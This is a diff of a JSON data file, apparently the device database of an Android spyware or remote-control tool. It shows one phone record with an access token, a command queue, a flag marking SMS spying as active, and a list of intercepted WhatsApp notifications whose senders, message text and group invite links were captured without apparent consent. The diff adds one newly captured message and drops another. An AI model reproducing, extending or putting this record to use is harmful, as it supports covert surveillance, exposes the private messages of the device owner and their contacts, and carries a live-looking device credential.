@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776002346789,
+    "lastSeen": 1776002356049,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𓆚꧁𝐿𝐸𝑍𝐴 𝐿𝑃𝑀꧂𓆚: ~ noey.",
+        "content": "🔗 noey store :c ‧˚꒰🐾୭ ˚. ᵎᵎ | https://chat.whatsapp.com/KrzfcGUb4aR3B17zYj22KA?mode=gi_t\n\nyang lagi nyari apk prem, top up game, dll. bisa check di gb atas yaa, thnk u.—🙌🏻🫧☀️🪿",
+        "time": "12/04 20:59",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776002358070
+      },
       {
         "appName": "WhatsApp",
         "sender": "⚊` 𝑳𝑝𝒎 & 𝑳𝑎𝒑𝑎𝒌 𝑵𝑒𝒆𝒅 𝐴𝒍𝑙 𝑹𝒂𝑽𝒆𝒏𝑬𝒍 ⋆˚🕸️˚⋆. 𝑳𝑬𝑭𝑻? 𝑰𝒁𝑰𝑵.",
@@ -4115,14 +4123,6 @@
         "time": "12/04 00:07",
         "pkg": "com.whatsapp",
         "receivedAt": 1775927278129
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (3 pesan): ~ kkdap catalyst/reality",
-        "content": "💟 Stiker",
-        "time": "12/04 00:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775927278120
       }
     ],
     "galleryPhotos": [],
